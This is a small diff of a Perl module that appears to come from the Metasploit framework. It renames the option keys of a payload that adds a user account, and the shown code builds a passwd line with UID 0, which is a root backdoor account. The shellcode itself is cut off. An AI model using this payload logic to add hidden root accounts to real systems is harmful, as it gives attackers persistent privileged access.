@@ -26,9 +26,9 @@ my $info =
   'Size'         => '',
   'UserOpts'     =>
    {
-      'USER' => [1, 'DATA', 'The username to create', 'metasploit'],
-      'PASS' => [1, 'DATA', 'The password for this user', 'metasploit'],
-      'SHELL' => [0, 'DATA', 'The shell for this user', '/bin/sh'],
+      'LUSER' => [1, 'DATA', 'The username to create', 'metasploit'],
+      'LPASS' => [1, 'DATA', 'The password for this user', 'metasploit'],
+      'LSHELL' => [0, 'DATA', 'The shell for this user', '/bin/sh'],
    },
 };
 
@@ -49,9 +49,9 @@ sub Build {
 
 sub Generate {
   my $self = shift;
-  my $user = $self->GetVar('USER') || 'metasploit';
-  my $pass = $self->GetVar('PASS');
-  my $shell = $self->GetVar('SHELL') || '/bin/sh';
+  my $user = $self->GetVar('LUSER') || 'metasploit';
+  my $pass = $self->GetVar('LPASS');
+  my $shell = $self->GetVar('LSHELL') || '/bin/sh';
   my $str = $user . ":" . crypt($pass, "AA") . ":0:0::/:" . $shell . "\n";
 
   my $shellcode =
